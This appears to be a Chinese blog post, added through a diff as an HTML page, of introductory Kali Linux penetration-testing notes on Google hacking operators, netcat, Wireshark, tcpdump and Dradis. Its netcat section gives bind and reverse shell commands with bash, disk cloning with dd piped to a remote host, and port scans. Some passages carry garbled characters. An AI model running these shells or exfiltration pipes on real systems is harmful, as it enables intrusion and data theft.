@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.lug.ustc.edu.cn/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"xchcloud.cn","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null,"changyan":{"text":"Load Disqus","order":-1}},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="信息收集Google Hacking Databasehttps://www.exploit-db.com/google-hacking-database/  《Goole Hacking For Penetration Testers》 《Google Hacking 渗透性测试者的利剑》">
+<meta name="keywords" content="入门,渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kali-linux渗透测试入门">
+<meta property="og:url" content="http://xchcloud.cn/kali-linux渗透测试入门/index.html">
+<meta property="og:site_name" content="chaoz的杂货铺">
+<meta property="og:description" content="信息收集Google Hacking Databasehttps://www.exploit-db.com/google-hacking-database/  《Goole Hacking For Penetration Testers》 《Google Hacking 渗透性测试者的利剑》">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-09-11T08:59:07.678Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="kali-linux渗透测试入门">
+<meta name="twitter:description" content="信息收集Google Hacking Databasehttps://www.exploit-db.com/google-hacking-database/  《Goole Hacking For Penetration Testers》 《Google Hacking 渗透性测试者的利剑》">
+
+<link rel="canonical" href="http://xchcloud.cn/kali-linux渗透测试入门/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>kali-linux渗透测试入门 | chaoz的杂货铺</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">chaoz的杂货铺</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">生命有息、学无止境、折腾不止</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xchcloud.cn/kali-linux渗透测试入门/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="超超">
+      <meta itemprop="description" content="那天早上雾散了，不止早上、不止雾。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chaoz的杂货铺">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          kali-linux渗透测试入门
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-08-30 20:47:26" itemprop="dateCreated datePublished" datetime="2018-08-30T20:47:26+08:00">2018-08-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-09-11 16:59:07" itemprop="dateModified" datetime="2021-09-11T16:59:07+08:00">2021-09-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/kali/" itemprop="url" rel="index"><span itemprop="name">kali</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/kali-linux渗透测试入门/#SOHUCS" itemprop="discussionUrl">
+        <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="kali-linux渗透测试入门/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Google-Hacking-Database"><a href="#Google-Hacking-Database" class="headerlink" title="Google Hacking Database"></a>Google Hacking Database</h3><p><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></p>
+<ul>
+<li>《Goole Hacking For Penetration Testers》</li>
+<li>《Google Hacking 渗透性测试者的利剑》<a id="more"></a>
+<h3 id="Google-基本搜索语法"><a href="#Google-基本搜索语法" class="headerlink" title="Google 基本搜索语法"></a>Google 基本搜索语法</h3>1、关键字不区分大小写<br>2、使用默认AND逻辑搜索<br>3、默认最多32个单词<br>4、用 + 号，强制带后面的单词搜索<br>5、| 或者 OR ，匹配多个关键字的任一个<br>6、混合用多种布尔操作时，将从左到右的顺序执行<br>7、默认下忽视关键字中部分常用单词<br>8、Google 使用网页搜索，定义互联网<br>9、Google 会智能地保存一些内容，比如一些过时的词，一些不适合呈现的内容<br>10、布尔操作符：AND(+) NOT(-) OR(|),现在不需要，google会自动匹配<h3 id="Google-高级搜索语法"><a href="#Google-高级搜索语法" class="headerlink" title="Google 高级搜索语法"></a>Google 高级搜索语法</h3>基本使用与语法 operatio：search_term<br>operatio 搜索命令<br>search_term 关键字搜索<br>1、intext<br>匹配网页正文中含有的关键字．可接多个关键字，空格或者逗号分隔；<br>2、allintext<br>和index类似，能接多个关踺字，能与其他操作符混合使用，可单独使用。<br>3、intitle<br>搜索网页标题中是否有所输入字符，可单独使用，可混合其他命令用；<br>4、allintitle<br>类似血itle，能接多个关键字，不能与其他操作符混合使用<br>5、cache<br>输入U心，，搜索特定页面的缓存快照，回查网页副本；<br>6、define<br>返回搜索关键字的定义：<br>7、filetype<br>搜索指定类型的文件，可以与其他操作符混合使用<br>8、ext<br>与filee等价<br>9、info<br>搜絷输入URL的摘要信息和其他相关信息，该操作符不能与其他作符及关键字混用；<br>10、inurl<br>搜索输入字符是否存在于U中；<br>11、allinurl<br>类似inurl，可指定多个字符，不能与其他憬作符混合使用，可单独使用；<br>12、link<br>搜索链接到所输入URL的页面，该亻乍符不需要关键字，不能与其他操作符及关键字混用；<br>13、site<br>搜索范围缩小到特定的网站，域或子域；<br>14、related<br>接一个URL，搜索与该URL相关的页面，该作符不能与其他悍作符及关键字混用；<br>15、numrange<br>接数字范围，用一个减号两边接数字来表示。减号左边为最小值，右边为最大值，从而搜索数字；<br>16、inanchor<br>搜索一个HTML标记中的一个链接的文本表现形式，闞在链接文本中搜索冒号后紧接的一个关键字；<br>17、insubject<br>搜索Google组的标题行；<br>18、daterange<br>搜索某个日期范围内GoogIe做索引的网页。</li>
+</ul>
+<h2 id="工具：NETCAT-NC"><a href="#工具：NETCAT-NC" class="headerlink" title="工具：NETCAT-NC"></a>工具：NETCAT-NC</h2><ul>
+<li>网络工具中的踹士军刀一一小身材、大智慧</li>
+<li>侦昕模式/传输模式</li>
+<li>telnet/获取bannerfä,a</li>
+<li>传输文本信息</li>
+<li>传输文件/§录</li>
+<li>加密传输文件</li>
+<li>远程控制/木马</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+</ul>
+<h3 id="TELNET-BANNER"><a href="#TELNET-BANNER" class="headerlink" title="TELNET / BANNER"></a>TELNET / BANNER</h3><p>man -c ：man 手册的缩写</p>
+<p>nc -h<br>[v1.10-41.1]<br>connect to somewhere:    nc [-options] hostname port[s] [ports] …<br>listen for inbound:    nc -l -p port [-options] [hostname] [port]<br>options:<br>    -c shell commands    as `-e’; use /bin/sh to exec [dangerous!!]<br>    -e filename        program to exec after connect [dangerous!!]<br>    -b            allow broadcasts<br>    -g gateway        source-routing hop point[s], up to 8<br>    -G num            source-routing pointer: 4, 8, 12, …<br>    -h            this cruft<br>    -i secs            delay interval for lines sent, ports scanned<br>        -k                      set keepalive option on socket<br>    -l            listen mode, for inbound connects<br>    -n            numeric-only IP addresses, no DNS<br>    -o file            hex dump of traffic<br>    -p port            local port number<br>    -r            randomize local and remote ports<br>    -q secs            quit after EOF on stdin and delay of secs<br>    -s addr            local source address<br>    -T tos            set Type Of Service<br>    -t            answer TELNET negotiation<br>    -u            UDP mode<br>    -v            verbose [use twice to be more verbose]<br>    -w secs            timeout for connects and final net reads<br>    -C            Send CRLF as line-ending<br>    -z            zero-I/O mode [used for scanning]<br>port numbers can be individual or ranges: lo-hi [inclusive];<br>hyphens in port names must be backslash escaped (e.g. ‘ftp-data’).</p>
+<p>eg：</p>
+<ul>
+<li>nc -vn<h4 id="远程电子取证的收集"><a href="#远程电子取证的收集" class="headerlink" title="远程电子取证的收集"></a>远程电子取证的收集</h4>PS：<em>|</em> 管道<br>eg: ls -l | nc -nv 10.1.1.XX XXXX<br>将当前电脑的文件信息 利用通道 + NC 传输到10.1.1.XX 终端显示出来 <h5 id="传输⽂文件"><a href="#传输⽂文件" class="headerlink" title="传输⽂文件"></a>传输⽂文件</h5></li>
+<li><ul>
+<li>A：nc -lp 333 &gt; 1.mp4</li>
+</ul>
+</li>
+<li><ul>
+<li>B：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</li>
+</ul>
+</li>
+</ul>
+<p>或</p>
+<ul>
+<li><ul>
+<li>A：nc -q 1 -lp 333 &lt; a.mp4</li>
+</ul>
+</li>
+<li><ul>
+<li>B： nc -nv 1.1.1.1 333 &gt; 2.mp4</li>
+</ul>
+</li>
+</ul>
+<p>-q 1：传输完成1s后断开连接<br>-lp：监听端口</p>
+<h5 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h5><p>需要结合其他命令</p>
+<ul>
+<li><ul>
+<li>A：tar -cvf - music/ | nc -lp 333 –q 1</li>
+</ul>
+</li>
+<li><ul>
+<li>B：nc -nv 1.1.1.1 333 | tar -xvf –</li>
+</ul>
+</li>
+<li><p>tar 是unix/linux下的打包器。</p>
+</li>
+<li>-cvf可以看做-c -v -f，-xvf则是-x -v -f。</li>
+<li>其中-c/-x分别表示create/extract，即打包/解包。</li>
+<li>-v 是verbose，表示显示打包/解包的详细过程。</li>
+<li>-f 表示file，表示打包输出/解包输入文件，后面跟”-“表示使用“标准输入/输出”（stdin/stdout)作为输出/输入文件。</li>
+<li>“|”表示“重定向”</li>
+</ul>
+<h5 id="加密传⽂文件"><a href="#加密传⽂文件" class="headerlink" title="加密传⽂文件"></a>加密传⽂文件</h5><ul>
+<li><ul>
+<li>A：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</li>
+</ul>
+</li>
+<li><ul>
+<li>B： mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</li>
+</ul>
+</li>
+<li><p>mcrypt 加解密工具命令</p>
+</li>
+<li>-flush 清空缓冲区</li>
+<li>-Fbq 加密参数</li>
+<li>-Fbqd 解密参数</li>
+</ul>
+<h5 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h5><ul>
+<li><ul>
+<li>A： cat 1.mp4 | nc -lp 333</li>
+</ul>
+</li>
+<li><ul>
+<li>B： nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</li>
+</ul>
+</li>
+<li><p>B 以流的形式传递给流媒体软件  默认缓存3000</p>
+</li>
+<li>A -lp 333 监听本地333端口<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5></li>
+<li><ul>
+<li>nc -nvz 1.1.1.1 1-65535</li>
+</ul>
+</li>
+<li><ul>
+<li>nc –vnzu 1.1.1.1 1-1024</li>
+</ul>
+</li>
+</ul>
+<h5 id="远程克隆硬盘或者内存"><a href="#远程克隆硬盘或者内存" class="headerlink" title="远程克隆硬盘或者内存"></a>远程克隆硬盘或者内存</h5><ul>
+<li><ul>
+<li>A： nc -lp 333 | dd of=/dev/sda</li>
+</ul>
+</li>
+<li><ul>
+<li>B： dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1</li>
+</ul>
+</li>
+</ul>
+<p>先克隆内存，再克隆硬盘</p>
+<p>为什么要远程取证克隆？而不是直接克隆？</p>
+<h5 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h5><h6 id="正向："><a href="#正向：" class="headerlink" title="正向："></a>正向：</h6><ul>
+<li><ul>
+<li>A：nc -lp 333 -c bash</li>
+</ul>
+</li>
+<li><ul>
+<li>B：nc 1.1.1.1 333<h6 id="反向："><a href="#反向：" class="headerlink" title="反向："></a>反向：</h6></li>
+</ul>
+</li>
+<li><ul>
+<li>A：nc -lp 333</li>
+</ul>
+</li>
+<li><ul>
+<li>B：nc 1.1.1.1 333 -c bash</li>
+</ul>
+</li>
+<li>注：Windows⽤用户把bash改成cmd；</li>
+</ul>
+<p>Nc只能在一定程度上替代ssh；可实现正反向控制（被控制与控制）；</p>
+<ul>
+<li>-c bash C盘上的bash shell （送给某机器shell、，等待某机器shell）</li>
+</ul>
+<hr>
+<ul>
+<li>优秀博客：<br><a href="https://www.cnblogs.com/nmap/p/6148306.html" target="_blank" rel="noopener">nc命令用法举例</a></li>
+</ul>
+<hr>
+<h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h5><ul>
+<li>Nc缺乏加密和⾝身份验证的能⼒力</li>
+<li>Ncat包含于nmap⼯工具包中</li>
+<li>A：ncat ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</li>
+<li><p>B：ncat -nv 1.1.1.1 333 –ssl</p>
+</li>
+<li><ul>
+<li>–allow ：允许</li>
+</ul>
+</li>
+<li><ul>
+<li>–ssl :都采取加密</li>
+</ul>
+</li>
+</ul>
+<h5 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h5><p>最优秀的抓包工具之一，哈哈，该工具仅仅是对抓到的包进行解码分析。</p>
+<ul>
+<li>抓包嗅探协议分析</li>
+<li>安全专家必备的技能</li>
+<li>抓包引擎</li>
+<li><ul>
+<li>Libpcap9—— Linux</li>
+</ul>
+</li>
+<li><ul>
+<li>Winpcap10—— Windows</li>
+</ul>
+</li>
+<li><p>解码能⼒</p>
+</li>
+<li><ul>
+<li>抓包后的软件保存为pcap，兼容性较好</li>
+</ul>
+</li>
+</ul>
+<h6 id="基本使⽤用⽅方法"><a href="#基本使⽤用⽅方法" class="headerlink" title="基本使⽤用⽅方法"></a>基本使⽤用⽅方法</h6><p>1、启动<br>2、选择抓包⺴⽹网卡<br>3、混杂模式<br>4、实时抓包<br>5、保存和分析捕获⽂文件<br>6、首选项</p>
+<h6 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h6><ul>
+<li>过滤掉干扰的数据包</li>
+<li>抓包筛选器</li>
+<li>显⽰示筛选器</li>
+</ul>
+<h6 id="常⻅见协议包"><a href="#常⻅见协议包" class="headerlink" title="常⻅见协议包"></a>常⻅见协议包</h6><ul>
+<li>数据包的分层结构</li>
+<li>Arp</li>
+<li>Icmp</li>
+<li>Tcp——三次握⼿手</li>
+<li>Udp</li>
+<li>Dns</li>
+<li>http</li>
+<li><p>ftp<br>包内容分层显示</p>
+</li>
+<li><ul>
+<li>ARP<br>eg:<br>Address ResoIution Protocol（request）<br>Hardware type:Ethernet（1）<br>ProtocoI type:IP（0×e800）<br>Hardware S1Ze：6<br>protocol size:4<br>Sender MAC address：dO：（7：（0：99：ed：3a{de：（7：CO：99：ed：3a）<br>Opcode：操作代码<br>Sender IP address：<br>Sender MAC address：<br>Target MAC address：<br>Target IP address:<br>192·168·1·1（192，168，1，1）<br>61：70：70：69：6e：67亻61：70：70：69：6e：67）<br>192·168·1·105（192．168．1．105）</li>
+</ul>
+</li>
+<li><ul>
+<li>SSDP<br>三层协议，<br>Tim to live : win 128 linux 65 unix 256<br>Type：二层往上三层协议<br>protcool：三层往上四层协议，第四层的网络协议有很多种种类</li>
+</ul>
+</li>
+</ul>
+<h6 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h6><h6 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h6><ul>
+<li>http</li>
+<li>Smtp</li>
+<li>Pop3</li>
+<li>Ssl</li>
+</ul>
+<h6 id="信息统计"><a href="#信息统计" class="headerlink" title="信息统计"></a>信息统计</h6><ul>
+<li>节点数</li>
+<li>协议分布</li>
+<li>包⼤大⼩小分布</li>
+<li>会话连接</li>
+<li>解码⽅方式</li>
+<li>专家系统</li>
+<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
+</ul>
+<h6 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h6><ul>
+<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
+</ul>
+<h6 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h6><ul>
+<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
+<li>企业抓包布署⽅方案</li>
+<li><ul>
+<li>Sniffer</li>
+</ul>
+</li>
+<li><ul>
+<li>Cace / riverbed</li>
+</ul>
+</li>
+<li><ul>
+<li>Cascad pilot</li>
+</ul>
+</li>
+</ul>
+<h6 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h6><ul>
+<li>抓包</li>
+<li><ul>
+<li>tcpdump -i eth0 -s 0 -w file.pcap</li>
+</ul>
+</li>
+<li>读取抓包⽂文件</li>
+<li><ul>
+<li>Tcpdump -r file.pcap</li>
+</ul>
+</li>
+</ul>
+<p>用法：</p>
+<ul>
+<li><ul>
+<li>筛选<br>tcpdump -n -r http.cap | awk ‘{print $3}’| sort –u<br>tcpdump -n src host 145.254.160.237 -r http.cap<br>tcpdump -n dst host 145.254.160.237 -r http.cap<br>tcpdump -n port 53 -r http.cap<br>tcpdump -nX port 80 -r http.cap</li>
+</ul>
+</li>
+<li><ul>
+<li>⾼高级筛选<br>tcpdump -A -n ‘tcp[13] = 24’ -r http.cap</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><ul>
+<li>介绍<br><a href="https://www.cnblogs.com/maifengqiang/p/3863168.html" target="_blank" rel="noopener">超级详细Tcpdump 的用法</a><br><a href="https://www.cnblogs.com/f-ck-need-u/p/7064286.html" target="_blank" rel="noopener">抓包工具tcpdump用法说明</a><br><a href="http://man.linuxde.net/tcpdump" target="_blank" rel="noopener">tcpdump命令</a><br><a href="http://www.mamicode.com/info-detail-2089175.html" target="_blank" rel="noopener">tcpdump抓包分析</a></li>
+</ul>
+</li>
+<li>三种关键字类型</li>
+<li><ul>
+<li>第一种是关于类型的关键字，主要包括host，net，port, 例如 host 210.27.48.2，指明 210.27.48.2是一台主机，net 202.0.0.0 指明 202.0.0.0是一个网络地址，port 23 指明端口号是23。如果没有指定类型，缺省的类型是host.</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><ul>
+<li>第二种是确定传输方向的关键字，主要包括src , dst ,dst or src, dst and src ,这些关键字指明了传输的方向。<br>举例说明：<br>src 210.27.48.2 ,指明ip包中源地址是210.27.48.2<br>dst net 202.0.0.0 指明目的网络地址是202.0.0.0<br>如果没有指明方向关键字，则缺省是src or dst关键字</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><ul>
+<li>第三种是协议的关键字，主要包括fddi,ip,arp,rarp,tcp,udp等类型。Fddi指明是在FDDI(分布式光纤数据接口网络)上的特定 的网络协议，实际上它是”ether”的别名，fddi和ether具有类似的源地址和目的地址，所以可以将fddi协议包当作ether的包进行处理和 分析。其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议，则tcpdump将会监听所有协议的信息包。</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><ul>
+<li>除了这三种类型的关键字之外，其他重要的关键字如下：gateway, broadcast,less,greater,还有三种逻辑运算，取非运算是 ‘not ‘ ‘! ‘, 与运算是’and’,’&amp;&amp;;或运算 是’or’ ,’||’；这些关键字可以组合起来构成强大的组合条件来满足人们的需要。</li>
+</ul>
+</li>
+</ul>
+<p>1、直接在终端启动tcpdump将监视第一个网络界面上所有流过的数据包<br>2、使用-i参数指定tcpdump监听的网络界面，这在计算机具有多个网络界面时非常有用，<br>3、使用-c参数指定要监听的数据包数量，<br>4、使用-w参数指定将监听到的数据包写入文件中保存</p>
+<p>eg：<br>1、抓取回环网口的包：tcpdump -i lo</p>
+<p>2、防止包截断：tcpdump -s0</p>
+<p>3、以数字显示主机及端口：tcpdump -n</p>
+<p>A想要截获所有210.27.48.1 的主机收到的和发出的所有的数据包：<br>tcpdump host 210.27.48.1</p>
+<p>B想要截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信，使用命令：（在命令行中适用　括号时，一定要<br>tcpdump host 210.27.48.1 and / (210.27.48.2 or 210.27.48.3 /)</p>
+<p>C如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：<br>tcpdump ip host 210.27.48.1 and ! 210.27.48.2</p>
+<p>D如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：<br>tcpdump tcp port 23 host 210.27.48.1</p>
+<p>E对本机的udp 123 端口进行监视 123 为ntp的服务端口<br> tcpdump udp port 123</p>
+<p>F 系统将只对名为hostname的主机的通信数据包进行监视。主机名可以是本地主机，也可以是网络上的任何一台计算机。下面的命令可以读取主机hostname发送的所有数据：<br>tcpdump -i eth0 src host hostname</p>
+<p>G 下面的命令可以监视所有送到主机hostname的数据包：<br>tcpdump -i eth0 dst host hostname</p>
+<p>H 我们还可以监视通过指定网关的数据包：<br>tcpdump -i eth0 gateway Gatewayname</p>
+<p>I 如果你还想监视编址到指定端口的TCP或UDP数据包，那么执行以下命令：<br>tcpdump -i eth0 host hostname and port 80</p>
+<p>J 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包<br>，使用命令：<br>tcpdump ip host 210.27.48.1 and ! 210.27.48.2</p>
+<p>K 想要截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信，使用命令<br>：（在命令行中适用　括号时，一定要<br>tcpdump host 210.27.48.1 and / (210.27.48.2 or 210.27.48.3 /)</p>
+<p>L 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：<br>tcpdump ip host 210.27.48.1 and ! 210.27.48.2</p>
+<p>M 如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：<br>tcpdump tcp port 23 host 210.27.48.1</p>
+<h2 id="过程文档记录"><a href="#过程文档记录" class="headerlink" title="过程文档记录"></a>过程文档记录</h2><ul>
+<li>Dradis</li>
+<li>短期临时小团队资源共享</li>
+<li>各种插件导入文件</li>
+<li><ul>
+<li>Keepnote</li>
+</ul>
+</li>
+<li><ul>
+<li>Truecrypt</li>
+</ul>
+</li>
+</ul>
+<h3 id="Dradis"><a href="#Dradis" class="headerlink" title="Dradis"></a>Dradis</h3><p>Dradis 框架是一个开源的协作和报告平台。它是由Ruby开发的一个独立的平台。</p>
+<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://dradisframework.com/ce/" target="_blank" rel="noopener">官网</a><br><a href="https://www.gremwell.com/what_is_magictree" target="_blank" rel="noopener">What is MagicTree?</a><br><a href="https://www.gremwell.com/magictree_vs_dradis" target="_blank" rel="noopener">MagicTree vs. Dradis</a><br><a href="https://resources.infosecinstitute.com/kali-reporting-tools/" target="_blank" rel="noopener">Kali Reporting Tools</a><br><a href="http://www.freebuf.com/sectool/104410.html" target="_blank" rel="noopener">工具推荐：Dradis，Kali渗透测试报告生成器</a></p>
